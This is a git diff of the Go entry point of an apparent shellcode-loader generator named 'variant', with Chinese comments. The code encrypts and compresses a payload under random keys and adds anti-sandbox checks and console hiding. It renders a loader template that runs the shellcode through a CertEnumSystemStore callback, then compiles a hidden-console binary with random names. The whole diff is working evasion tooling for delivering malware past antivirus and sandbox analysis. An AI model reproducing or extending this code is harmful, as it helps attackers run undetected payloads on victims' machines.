@@ -6,7 +6,7 @@ import (
 	"variant/build"
 	"variant/compress"
 	"variant/crypto"
-	"variant/enc"
+	"variant/encoder"
 	"variant/log"
 	"variant/rand"
 	"variant/render"
@@ -16,8 +16,8 @@ func main() {
 	// 反沙箱模块
 	sandbox := render.SandBox{
 		Methods: []string{
-			"sandbox.BootTime",
 			"sandbox.GetDesktopFiles",
+			"sandbox.HideConsoleW32",
 		}}
 
 	// 压缩算法模块
@@ -28,54 +28,58 @@ func main() {
 	}
 
 	// 设置加密参数
-	params := enc.Payload{
-		PlainText: "render/templates/payload.bin",
+	params := encoder.Payload{
+		PlainText: "output/payload.bin",
 		FileName:  rand.RStrings(),
 		Path:      "output",
 		Key:       rand.LByteStrings(16),
 		IV:        rand.LByteStrings(16),
 	}
-	// 加密之后的 shellcode
+	// 读取shellcode，返回加密之后的 strings
 	payload, err := params.SetKeyIV(crypto.XorAesHexBase85Encrypt) // 传入加密方法，根据加密方法的签名渲染模板
 	if err != nil {
 		log.Fatal(err)
 	}
 
+	// 压缩算法
 	payload, _ = compress.LzwCompress([]byte(payload), 8)
 
+	// 本地加载需要的数据
 	local := render.Local{
-		Payload:  payload,
-		KeyName:  rand.RStrings(),
-		KeyValue: string(params.Key),
-		IvName:   rand.RStrings(),
-		IvValue:  string(params.IV),
+		Payload:      payload,
+		KeyName:      rand.RStrings(),
+		KeyValue:     string(params.Key),
+		IvName:       rand.RStrings(),
+		IvValue:      string(params.IV),
+		MainLocal:    rand.RStrings(),
+		DecryptLocal: "crypto.XorAesHexBase85Decrypt",
 	}
 
-	loader := render.Loader{
-		Method: "loader.CreateRemoteThreadHalos",
+	load := render.Loader{
+		Import: "variant/cloader",
+		Method: "cloader.CertEnumSystemStore",
 	}
 
 	// 定义模板渲染数据
 	data := render.Data{
-		CipherText:    rand.RStrings(),
-		PlainText:     rand.RStrings(),
-		DecryptMethod: "crypto.XorAesHexBase85Decrypt",
-		Loader:        loader,
-		Local:         local,
-		SandBox:       sandbox,
-		Compressor:    compressor,
+		CipherText: rand.RStrings(),
+		PlainText:  rand.RStrings(),
+		Loader:     load,
+		Local:      local,
+		SandBox:    sandbox,
+		Compressor: compressor,
 		//Args:          args,
 	}
 
 	// 设置模板的渲染参数
 	tOpts := render.TmplOpts{
-		TmplFile:     "render/templates/v4/Base.tmpl",
+		TmplFile:     "render/templates/v5/Base.tmpl",
 		OutputDir:    "output",
 		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
 		Data:         data,
 	}
 	// 生成模板
-	err = render.TmplRender(tOpts)
+	err = tOpts.TmplRender()
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -87,9 +91,9 @@ func main() {
 		HideConsole: true,
 		CompilePath: "output",
 		BuildMode:   "pie",
-		Literals:    true,
-		GSeed:       true,
-		Tiny:        true,
+		//Literals:    true,
+		//GSeed:       true,
+		//Tiny:        true,
 	}
 
 	// 编译
